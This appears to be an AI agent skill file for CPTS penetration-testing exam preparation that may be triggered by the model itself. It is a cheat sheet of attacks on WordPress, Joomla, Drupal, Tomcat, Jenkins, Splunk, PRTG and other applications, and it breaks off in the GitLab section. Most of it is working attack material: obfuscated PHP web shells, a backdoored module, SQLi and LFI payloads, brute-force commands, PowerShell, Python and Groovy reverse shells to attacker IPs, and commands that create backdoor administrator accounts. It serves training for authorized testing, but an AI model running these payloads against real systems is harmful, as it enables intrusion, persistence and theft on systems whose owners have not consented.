---
name: cpts-initial-access
description: "CPTS Initial Access & Exploitation: attacking common applications (WordPress, Joomla, Drupal, Tomcat, Jenkins, Splunk, GitLab, etc.), common services (FTP, SMB, SQL, RDP, DNS, SMTP), web attacks (HTTP verb tampering, IDOR, XXE), server-side attacks, and API attacks. Use when targeting specific applications/services for initial access."
argument-hint: "[target] [service-type]"
allowed-tools:
  - read
  - grep
  - glob
  - exec
  - webfetch
triggers:
  - user
  - model
---

> ⚠️ **AUTHORIZED USE ONLY** ⚠️
> This skill is provided for authorized penetration testing, security research, and CPTS exam preparation ONLY.
> Only use these techniques against systems you have explicit written permission to test.
> Unauthorized access to computer systems is illegal. You are responsible for your actions.

# CPTS Initial Access & Exploitation

Comprehensive reference for the "Initial Access & Exploitation" phase of the HTB CPTS curriculum. Covers attacking common applications (CMS, servlet containers, infrastructure monitoring, customer service/config management, CGI, misc apps), common services (FTP, SMB, SQL, RDP, DNS, SMTP), web attacks (HTTP verb tampering, IDOR, XXE), server-side attacks (SSRF, SSTI, SSI, XSLT), and API/web service attacks (XML-RPC, JSON-RPC, SOAP, REST).

---

## Table of Contents

1. [Content Management Systems (CMS)](#1-content-management-systems-cms)
   - [WordPress](#wordpress)
   - [Joomla](#joomla)
   - [Drupal](#drupal)
2. [Servlet Containers & Software Development](#2-servlet-containers--software-development)
   - [Tomcat](#tomcat)
   - [Jenkins](#jenkins)
3. [Infrastructure & Network Monitoring Tools](#3-infrastructure--network-monitoring-tools)
   - [Splunk](#splunk)
   - [PRTG Network Monitor](#prtg-network-monitor)
4. [Customer Service Mgmt & Configuration Management](#4-customer-service-mgmt--configuration-management)
   - [osTicket](#osticket)
   - [GitLab](#gitlab)
5. [Common Gateway Interfaces (CGI)](#5-common-gateway-interfaces-cgi)
   - [Shellshock](#shellshock)
6. [Miscellaneous Applications](#6-miscellaneous-applications)
   - [IIS Tilde Enumeration](#iis-tilde-enumeration)
   - [Attacking LDAP](#attacking-ldap)
   - [Web Mass Assignment Vulnerabilities](#web-mass-assignment-vulnerabilities)
7. [Attacking Common Services](#7-attacking-common-services)
   - [FTP](#ftp)
   - [SMB](#smb)
   - [SQL Databases](#sql-databases)
   - [RDP](#rdp)
   - [DNS](#dns)
   - [SMTP](#smtp)
8. [Web Attacks](#8-web-attacks)
   - [HTTP Verb Tampering](#http-verb-tampering)
   - [Insecure Direct Object References (IDOR)](#insecure-direct-object-references-idor)
   - [XML External Entity (XXE) Injection](#xml-external-entity-xxe-injection)
9. [Server-Side Attacks](#9-server-side-attacks)
   - [SSRF](#server-side-request-forgery-ssrf)
   - [SSTI](#server-side-template-injection-ssti)
   - [SSI Injection](#server-side-includes-ssi-injection)
   - [XSLT Injection](#xslt-injection)
10. [Web Service & API Attacks](#10-web-service--api-attacks)

---

## 1. Content Management Systems (CMS)

### WordPress

#### Basic WordPress Identification

```bash
curl -s http://blog.inlanefreight.local/robots.txt  # Check for disallowed paths
curl -s http://blog.inlanefreight.local/wp-admin/  # Observe redirection behavior
curl -s http://blog.inlanefreight.local/wp-content/plugins/  # Check for plugin directory
curl -s http://blog.inlanefreight.local/wp-content/themes/  # Check for theme directory
```

#### WordPress Version and Theme Enumeration

```bash
curl -s http://blog.inlanefreight.local | grep -i "WordPress"  # Check for version details
curl -s http://blog.inlanefreight.local/ | grep -i "themes"  # Identify themes
curl -s http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css  # Check theme stylesheet
curl -s http://blog.inlanefreight.local/wp-content/themes/transport-gravity/readme.txt  # Check theme readme
```

#### Plugin Enumeration

```bash
curl -s http://blog.inlanefreight.local/ | grep -i "plugins"
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt  # Check for version info
curl -s http://blog.inlanefreight.local/?p=1 | grep -i "plugins"  # Look for references in page content
```

#### User Enumeration (Manual)

Detect valid usernames using login response differences:

```bash
curl -s -I http://blog.inlanefreight.local/wp-login.php -d "log=admin&pwd=invalid"  # Check response for valid user
curl -s -I http://blog.inlanefreight.local/wp-login.php -d "log=invalid&pwd=invalid"  # Check response for invalid user
```

#### WordPress REST API User Enumeration

```bash
curl -s http://blog.inlanefreight.local/wp-json/wp/v2/users
```

#### WPScan Enumeration

```bash
sudo gem install wpscan
wpscan -h
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token YOUR_API_TOKEN
```

##### WPScan Advanced Enumeration

```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate u,p,t  # Enumerate users, plugins, and themes
```

##### WPScan Brute-force Attack

```bash
sudo wpscan --url http://blog.inlanefreight.local --passwords /usr/share/wordlists/rockyou.txt --usernames admin,john
```

##### WPScan with Proxy

```bash
sudo wpscan --url http://blog.inlanefreight.local --proxy 127.0.0.1:8080
```

#### XML-RPC Checks

```bash
curl -i http://blog.inlanefreight.local/xmlrpc.php
```

##### XML-RPC Exploitation (system.multicall brute-force)

```bash
curl -X POST -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' http://blog.inlanefreight.local/xmlrpc.php
```

##### XML-RPC Brute Force Script

```bash
python3 xmlrpc_bruteforce.py -u http://blog.inlanefreight.local/xmlrpc.php -U users.txt -P passwords.txt
```

#### Additional Security Checks

##### Robots.txt Insights

```bash
curl -s http://blog.inlanefreight.local/robots.txt | grep "Disallow"
curl -s http://blog.inlanefreight.local/wp-config.php  # Test if restricted files are accessible
```

##### Page Source Analysis

```bash
curl -s http://blog.inlanefreight.local | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*"
```

##### Detect Open Directory Listings

```bash
curl -s http://blog.inlanefreight.local/wp-content/uploads/
```

#### Attacking WordPress

##### Manual Code Execution via Theme Editor (404.php)

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

##### Metasploit wp_admin_shell_upload

```bash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
```

##### mail-masta LFI Exploit

```bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

##### wpDiscuz RCE Exploit

```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```

##### wp-config.php Exposure Check

```bash
curl -s http://blog.inlanefreight.local/wp-config.php
```

##### Web Shell Obfuscation Example

```php
<?php eval(base64_decode("c3lzdGVtKCRfR0VUWyJjbWQiXSk7")); ?>
```

---

### Joomla

#### Basic Joomla Identification

```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla  # Check for Joomla in HTML source
curl -s http://dev.inlanefreight.local/robots.txt             # Check robots.txt for disallowed directories
curl -s http://dev.inlanefreight.local/README.txt              # Check for version information
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml # Detailed version info
curl -s http://dev.inlanefreight.local/plugins/system/cache/cache.xml # Approximate version info
curl -I http://dev.inlanefreight.local/favicon.ico # Check for Joomla default favicon
```

#### Joomla Version Enumeration

```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool # Joomla usage stats API
curl -I http://dev.inlanefreight.local/ | grep "X-Content-Encoded-By" # Joomla HTTP headers for version info
curl -s http://dev.inlanefreight.local/CHANGELOG.php # Check for changelog
```

#### Automated Scanning

##### Droopescan

```bash
sudo pip3 install droopescan
droopescan -h
droopescan scan joomla --url http://dev.inlanefreight.local/
```

##### JoomlaScan (Python 2.7)

```bash
sudo python2.7 -m pip install urllib3 certifi bs4
python2.7 joomlascan.py -u http://dev.inlanefreight.local/
```

#### Joomla Login Brute-Force

```bash
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

#### Extension Enumeration (Manual)

```bash
curl -s http://dev.inlanefreight.local/components/
curl -s http://dev.inlanefreight.local/modules/
curl -s http://dev.inlanefreight.local/plugins/
curl -s http://dev.inlanefreight.local/templates/
curl -s http://dev.inlanefreight.local/media/
curl -s http://dev.inlanefreight.local/components/com_content/assets/js/content.js
```

#### Configuration File & Backup File Checks

```bash
curl -s http://dev.inlanefreight.local/configuration.php  # Check for configuration exposure
curl -s http://dev.inlanefreight.local/configuration.php.bak
curl -s http://dev.inlanefreight.local/backup.zip
curl -s http://dev.inlanefreight.local/joomla.sql
```

#### Directory & File Enumeration

```bash
dirb http://dev.inlanefreight.local /usr/share/wordlists/dirb/common.txt
```

#### Joomla REST API Enumeration (If Enabled)

```bash
curl -s http://dev.inlanefreight.local/api/index.php/v1/users
```

#### Joomla CLI (If Accessible)

```bash
joomla user:list
```

#### Exploiting Known Joomla Vulnerabilities

##### SQL Injection (CVE-2017-8917)

```bash
sqlmap -u "http://dev.inlanefreight.local/index.php?option=com_content&id=1" --dbs --batch
```

##### Unauthenticated Admin Takeover (CVE-2023-23752)

```bash
curl -X GET "http://dev.inlanefreight.local/api/index.php/v1/config/application?public=true"
```

#### Joomla User Enumeration

```bash
curl -X POST -d "username=admin" http://dev.inlanefreight.local/index.php?option=com_users&view=reset
```

#### Joomla Debug Mode & Log File Checks

```bash
curl -s http://dev.inlanefreight.local/logs/error.php  # Check for error logs
curl -s http://dev.inlanefreight.local/logs/debug.log  # Check for debug logs
grep -i "password" logs/error.php
```

#### Attacking Joomla

##### Joomla Admin Panel Code Execution (Template Customization)

```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

- Log in to `/administrator` with admin credentials.
- Modify template files to inject PHP code for RCE.
- Use non-standard parameters and clean up web shells.

##### Joomla Core Directory Traversal (CVE-2019-10945)

```bash
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```

##### Metasploit Joomla Modules

```bash
msf6 > search joomla
msf6 > use exploit/unix/webapp/joomla_...
msf6 > set RHOSTS dev.inlanefreight.local
msf6 > set RPORT 80
msf6 > set TARGETURI /administrator/
msf6 > set USERNAME admin
msf6 > set PASSWORD admin
msf6 > set LHOST [your_ip]
msf6 > set LPORT 4444
msf6 > exploit
```

##### Database Exploitation (SQL injection)

```bash
sqlmap -u "http://dev.inlanefreight.local/index.php?id=1" --dbs --batch
sqlmap -u "http://dev.inlanefreight.local/index.php?id=1" -D [database_name] --tables --batch
sqlmap -u "http://dev.inlanefreight.local/index.php?id=1" -D [database_name] -T [table_name] --columns --batch
sqlmap -u "http://dev.inlanefreight.local/index.php?id=1" -D [database_name] -T [table_name] -C [column1,column2] --dump --batch
```

##### Advanced Web Shell Techniques

```bash
php -r '$s="c3lzdGVtKCRfR0VUWyJjbWQiXSk7";eval(base64_decode($s));' > shell.php
```

---

### Drupal

#### Basic Drupal Identification

```bash
curl -s http://drupal.inlanefreight.local | grep Drupal  # Check HTML source for Drupal metadata
curl -s http://drupal.inlanefreight.local/robots.txt  # Analyze robots.txt for disallowed directories and node references
curl -s http://drupal.inlanefreight.local/node/1  # Check for node paths (common Drupal URL structure)
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt  # Check for version information (may be blocked)
```

#### Drupal Version Enumeration

```bash
droopescan scan drupal -u http://drupal.inlanefreight.local  # Automated version detection and module/theme enumeration
curl -s http://drupal.inlanefreight.local/core/assets/vendor/jquery/jquery.min.js | grep "Drupal"
curl -s http://drupal.inlanefreight.local/rss.xml | grep generator  # Check RSS feeds for generator metadata
```

Database Version check (if access gained):

```sql
SELECT version FROM system;
```

#### Drupal Module Enumeration

```bash
curl -s http://drupal.inlanefreight.local/modules/
curl -s http://drupal.inlanefreight.local/modules/[module_name]/[module_file].js
curl -s http://drupal.inlanefreight.local/modules/[module_name]/[module_file].css
curl -s http://drupal.inlanefreight.local/modules/[module_name]/[module_file].info.yml  # Module version info
```

#### Drupal Theme Enumeration

```bash
curl -s http://drupal.inlanefreight.local/themes/
curl -s http://drupal.inlanefreight.local/themes/[theme_name]/style.css
curl -s http://drupal.inlanefreight.local/themes/[theme_name]/[theme_file].info.yml
```

#### Drupal Configuration File Check

```bash
curl -s http://drupal.inlanefreight.local/sites/default/settings.php
```

#### Drupal User Enumeration

```bash
curl -s http://drupal.inlanefreight.local/?q=user
curl -s http://drupal.inlanefreight.local/user/1  # Test default admin user enumeration
```

#### Drupal REST API Enumeration

```bash
curl -s http://drupal.inlanefreight.local/rest/user/login_status?_format=json
curl -s http://drupal.inlanefreight.local/rest/
curl -s http://drupal.inlanefreight.local/rest/export?_format=json
```

#### Drupal Content Enumeration

```bash
curl -s http://drupal.inlanefreight.local/node/2  # Check if sequential node IDs exist
curl -s http://drupal.inlanefreight.local/node.json  # Check if Drupal JSON API is enabled
```

#### Drupal Backup & Debug Files Enumeration

```bash
curl -s http://drupal.inlanefreight.local/sites/default/files/backup.sql
curl -s http://drupal.inlanefreight.local/phpinfo.php
```

#### Drupal Admin Panel Access Check

```bash
curl -s http://drupal.inlanefreight.local/user/login
curl -s http://drupal.inlanefreight.local/admin
```

#### Drupal GraphQL API Enumeration (if enabled)

```bash
curl -X POST http://drupal.inlanefreight.local/graphql -H "Content-Type: application/json" --data '{"query":"{__schema { types { name } }}"}'
```

#### Attacking Drupal

##### PHP Filter Module Exploitation (Drupal < 8)

```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

- Enable PHP filter module, inject code via content.

##### Backdoored Module Upload

```bash
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' > captcha/shell.php
echo '<IfModule mod_rewrite.c>RewriteEngine On;RewriteBase /</IfModule>' > captcha/.htaccess
tar cvf captcha.tar.gz captcha/captcha/
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

##### Drupalgeddon (CVE-2014-3704)

```bash
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

- Create admin user via SQL injection.

##### Drupalgeddon2 (CVE-2018-7600)

```bash
python3 drupalgeddon2.py
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

- RCE via user registration form.

##### Drupalgeddon3 (CVE-2018-7602)

```bash
msf6 > use exploit/multi/http/drupal_drupageddon3
msf6 > set rhosts 10.129.42.195
msf6 > set VHOST drupal-acc.inlanefreight.local
msf6 > set drupal_session SESS...
msf6 > set DRUPAL_NODE 1
msf6 > set LHOST 10.10.14.15
msf6 > exploit
```

- RCE via Form API (requires authenticated session).

##### Drupal Configuration File Exploitation

```bash
curl -s http://drupal.inlanefreight.local/sites/default/settings.php
ls -l sites/default/settings.php
cat .htaccess
```

##### Database Exploitation (SQL Injection)

```bash
curl "http://drupal.inlanefreight.local/node/1?id=1'--"
curl "http://drupal.inlanefreight.local/node/1?id=1' OR '1'='1"
sqlmap -u "http://drupal.inlanefreight.local/node/1?id=1" --dbs --batch
sqlmap -u "http://drupal.inlanefreight.local/node/1?id=1" -D [database_name] --tables --batch
sqlmap -u "http://drupal.inlanefreight.local/node/1?id=1" -D [database_name] -T [table_name] --columns --batch
sqlmap -u "http://drupal.inlanefreight.local/node/1?id=1" -D [database_name] -T [table_name] -C [column1,column2] --dump --batch
sqlmap -u "http://drupal.inlanefreight.local/node/1?id=1" --level 5 --risk 3
```

##### XXE Injection

```bash
curl -X POST -H "Content-Type: application/xml" -d '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>' http://drupal.inlanefreight.local/xml_endpoint
```

##### SSRF

```bash
curl "http://drupal.inlanefreight.local/page?url=http://169.254.169.254/latest/meta-data/"
```

##### Drupal Brute Forcing

```bash
wpscan --url http://drupal.inlanefreight.local/ --enumerate u --passwords /usr/share/wordlists/rockyou.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt drupal.inlanefreight.local http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login:Invalid username or password"
```

---

## 2. Servlet Containers & Software Development

### Tomcat

#### Tomcat Version Detection

```bash
curl -I http://target:port/ | grep -i "Server"  # HTTP Server header
curl -s http://target:port/docs/ | grep -i "Apache Tomcat"  # /docs page
curl -s http://target:port/nonexistentpage  # Error pages may leak version
```

#### Tomcat Directory Structure (Key Files)

- `/bin` - Executable scripts
- `/conf/tomcat-users.xml` - Stores user credentials and roles
- `/conf/web.xml` - Defines web application routes and configurations
- `/webapps/` - Web application deployment directory

#### Manager Application Enumeration

##### Directory Brute-forcing

```bash
gobuster dir -u http://target:port/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://target:port/FUZZ
```

Look for `/manager` and `/host-manager` paths.

##### Default Credentials

```
tomcat:tomcat
admin:admin
tomcat:password
role1:role1
role:changeme
```

##### Brute-forcing Credentials

```bash
hydra -l tomcat -P /usr/share/wordlists/rockyou.txt target http-get /manager/html
```

#### WAR File Upload (Remote Code Execution)

After authentication to `/manager`, upload a malicious WAR file containing a JSP web shell:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=yourIP LPORT=yourPort -f war > shell.war
nc -lnvp <attacker_port>
```

Deploy via Manager interface and access via browser: `http://target:port/shell.jsp`

Alternative manual WAR:

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
```

#### JMX Enumeration & Exploitation

```bash
java -jar jmxterm-1.0-alpha-4-uber.jar --url service:jmx:rmi:///jndi/rmi://target:port/jmxrmi
```

Metasploit:

```bash
use exploit/multi/misc/java_jmx_server
set RHOST target
set RPORT 1099
run
```

#### AJP Connector (Ghostcat CVE-2020-1938)

```bash
nmap -p 8009 --script ajp-headers target
nmap -sV -p 8009,8080 <target_ip>
python2.7 tomcat-ajp.lfi.py <target_ip> -p 8009 -f WEB-INF/web.xml
python3 ghostcat.py -u target:8009
```

#### CVE Enumeration & Exploitation

```bash
searchsploit tomcat [version]
```

#### Attacking Tomcat

##### Tomcat Manager Brute-Force (Metasploit)

```bash
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS <target_ip>
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT <target_port>
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST <target_vhost>
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
```

```bash
python3 mgr_brute.py -U http://<target>:<port>/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

##### CVE-2009-3548 (Tomcat Deployment Bypass)

```bash
curl -T shell.war http://<target_ip>:8080/manager/deploy?path=/shell
```

##### CVE-2017-12617 (Arbitrary JSP Upload via HTTP PUT)

```bash
curl -v -X PUT -d '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' http://<target>:8080/shell.jsp
```

##### CVE-2020-9484 (Tomcat Deserialization RCE)

```bash
ysoserial -g CommonsCollections6 -o raw -c "nc -e /bin/bash <attacker_ip> <port>" > payload.ser
curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.ser http://<target>:8080
```

##### Metasploit JSP Upload via RCE

```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <target_ip>
set USERNAME admin
set PASSWORD admin
run
```

##### JMX RMI (CVE-2016-8735)

```bash
msfconsole
use exploit/multi/misc/java_jmx_server
set RHOST <target_ip>
set RPORT 1099
run
```

##### Weak Configuration

```bash
curl -u admin:admin http://<target>:8080/manager/html
```

---

### Jenkins

#### Jenkins Version Detection

```bash
curl -I http://target:8080/
nmap -sV -p 8080 <target_ip>
curl http://target:8080/jenkins/cli/ | grep -i "Jenkins CLI"
```

#### Jenkins Port Enumeration

- Default HTTP: 8080
- Slave Communication: 5000

```bash
nmap -sV -p 8080,5000 <target_ip>
```

#### Jenkins CLI Enumeration

```bash
java -jar jenkins-cli.jar -s http://target:8080/jenkins/ help
java -jar jenkins-cli.jar -s http://target:8080/jenkins/ list-plugins
java -jar jenkins-cli.jar -s http://target:8080/jenkins/ list-jobs
```

#### Jenkins Plugin Enumeration

```bash
curl http://target:8080/jenkins/pluginManager/
```

- Common vulnerability source. Inspect plugin names, search for CVEs on NVD/Exploit-DB.
- Example: Pipeline: Groovy plugin (CVE-2019-10352) allows arbitrary code execution.

#### Jenkins API Enumeration

```bash
curl http://target:8080/jenkins/api/
curl http://target:8080/jenkins/api/json
```

#### Exploiting Jenkins Script Console

##### Remote Command Execution

```bash
curl -X POST -u admin:password --data-urlencode "script=println('Exploit successful')" http://target:8080/jenkins/scriptText
```

##### Groovy Command Execution (Linux)

```bash
curl -X POST -d "script=println 'id'.execute()" http://target:8080/jenkins/scriptText
```

##### Groovy Command Execution (Windows)

```bash
curl -X POST -d "script=def cmd = 'cmd.exe /c dir'.execute(); println cmd.text" http://target:8080/jenkins/scriptText
```

##### Reverse Shell via Groovy (Linux)

```bash
curl -X POST -d "script=r = Runtime.getRuntime(); p = r.exec(['/bin/bash','-c','exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do $line 2>&5 >&5; done'] as String[]); p.waitFor()" http://target:8080/jenkins/scriptText
nc -lvnp 8443
```

#### Exploiting Build Job Misconfigurations

```bash
java -jar jenkins-cli.jar -s http://target:8080/jenkins/ create-job exploit_job < exploit.xml
```

#### Pipeline Script Injection (Groovy RCE)

```groovy
def cmd = "whoami".execute()
println cmd.text
```

#### Extracting Credentials from Jenkins

```bash
curl -u admin:password http://target:8080/jenkins/credentials/store/system/domain/_/
```

#### Persistence - Create Backdoor User

```bash
curl -X POST -u admin:password --data-urlencode "script=jenkins.model.Jenkins.instance.securityRealm.createAccount('attacker', 'password')" http://target:8080/jenkins/scriptText
```

#### Unauthenticated Exploits (Public Jenkins)

```bash
curl http://target:8080/jenkins/  # Check for anonymous access
```

#### Jenkins SSRF

```groovy
def url = "http://internal-service.local:8080"
def conn = url.toURL().openConnection()
println conn.getInputStream().text
```

---

## 3. Infrastructure & Network Monitoring Tools

### Splunk

#### Discovery/Footprinting

```bash
sudo nmap -sV <target_ip> -p 8000,8089
```

- Identify `Splunkd httpd` (port 8000/8089).
- Web interface: `http://<target_ip>:8000`
- Default credentials (older versions): `admin:changeme`
- Common weak passwords: `admin`, `Welcome`, `Password123`
- Check for Splunk Free (no authentication).

#### REST API (Port 8089)

```bash
curl -k -u admin:changeme https://<target_ip>:8089/services/server/info
```

#### Splunk Log Extraction (if accessible)

```bash
curl -k -u admin:changeme https://<target_ip>:8089/services/search/jobs/export -d search="search index=_internal | head 10"
```

#### SSRF

```bash
curl -k -X POST -H "Content-Type: application/x-www-form-urlencoded" \
-d "splunk_server=127.0.0.1&remote_server=http://169.254.169.254/latest/meta-data/" \
https://<target_ip>:8089/en-US/splunkd/__raw/services/data/inputs/http
```

#### Credential Brute-forcing

```bash
hydra -L users.txt -P passwords.txt <target_ip> http-form-post "/en-US/account/login:username=^USER^&password=^PASS^:Invalid username or password"
```

#### Session Hijacking (If Cookies Leak)

```bash
curl -k -b "splunkd_8000=<session_cookie>" https://<target_ip>:8000/en-US/
```

#### Attacking Splunk - Reverse Shell via Scripted Inputs

##### Create Splunk App Directory Structure

```bash
mkdir -p splunk_shell/splunk_shell/bin
mkdir -p splunk_shell/splunk_shell/default
tree splunk_shell/splunk_shell/
```

##### PowerShell Reverse Shell (Windows) - `splunk_shell/splunk_shell/bin/rev.ps1`

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

##### Batch File to Execute PowerShell (Windows) - `splunk_shell/splunk_shell/bin/run.bat`

```batch
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

##### Splunk App Configuration (Windows) - `splunk_shell/splunk_shell/default/inputs.conf`

```ini
[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

##### Python Reverse Shell (Linux) - `splunk_shell/splunk_shell/bin/rev.py`

```python
import sys, socket, os, pty

ip = "10.10.14.15"
port = 443
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```

##### Splunk App Configuration (Linux) - `splunk_shell/splunk_shell/default/inputs.conf`

```ini
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell
```

##### Package and Deploy

```bash
tar -cvzf updater.tar.gz splunk_shell/splunk_shell/
sudo nc -lnvp 443
```

1. Navigate to "Apps" -> "Manage Apps" -> "Install app from file" in Splunk Web UI.
2. Upload `updater.tar.gz`.

##### Deploy to Deployment Server

```bash
cp updater.tar.gz $SPLUNK_HOME/etc/deployment-apps/
splunk restart  # Windows
sudo systemctl restart splunk  # Linux
```

#### Key Points

- Splunk often runs as root/SYSTEM.
- Compromise = access to sensitive logs & network data.
- Scripted inputs = direct RCE.

---

### PRTG Network Monitor

#### Discovery and Enumeration

```bash
sudo nmap -sV -p- --open -T4 10.129.201.50
```

Look for port `8080` with "Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)."

EyeWitness may reveal default credentials (`prtgadmin:prtgadmin`).

```bash
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version
```

#### Exploiting CVE-2018-9276 (Authenticated Command Injection)

1. Login with default or discovered credentials (`prtgadmin:Password123`).
2. Go to **Setup** -> **Account Settings** -> **Notifications**.
3. Click **Add new notification**, name it (e.g., `pwn`).
4. Check **EXECUTE PROGRAM**.
5. In **Program File**, select `Demo exe notification - outfile.ps1`.
6. In **Parameter** field, enter:

```plaintext
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

7. Click **Save**, then click **Test** for the notification.

#### Verification

```bash
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```

Alternative: RDP, WinRM, `evil-winrm`, `wmiexec.py`, `psexec.py`.

#### Reverse Shell (Alternative Payload)

```plaintext
test.txt;powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```bash
nc -lvp 4444
```

- Target PRTG version must be vulnerable (before `18.2.39`).

---

## 4. Customer Service Mgmt & Configuration Management

### osTicket

#### Credential Dumping with Dehashed

```bash
sudo python3 dehashed.py -q inlanefreight.local -pid : 5996447501
```

#### Subdomain Enumeration

Tools: sublist3r, amass, assetfinder.

#### osTicket Enumeration

- Run **EyeWitness** to capture web application screenshots.
- Look for cookies like `OSTSESSID`, indicating an osTicket session.
- Check the page footer for "powered by osTicket" or "Support Ticket System."

##### Creating a Ticket (to obtain email addresses)

1. Open the osTicket web portal.
2. Submit a new support ticket.
3. Note the **assigned internal email address** (e.g., `940288@inlanefreight.local`).
4. Use this email to register for other company services (Slack, GitLab, etc.).

#### Credential Testing

- Manually test leaked credentials on the osTicket portal and other discovered services.
- Check support tickets for sensitive information (password reset details, internal system configurations, employee email addresses).

#### Exploiting osTicket Vulnerabilities

Check **Exploit-DB** for: RFI, SQLi, File Upload Exploits, XSS, SSRF.

- **CVE-2020-24881** (SSRF in osTicket v1.14.1): internal port scanning or accessing internal resources.

---

### GitLab

#### Discovery

Visiting the GitLab URL directly will usually display the GitLab login page.

#### Enumeration

##### Version Enumeration

The GitLab version is typically found on the `/help` page, but requires authentication.

##### Public Projects (`/explore`)

May contain: API interaction scripts, configuration files with secrets, SSH private keys, source code for vulnerability analysis.

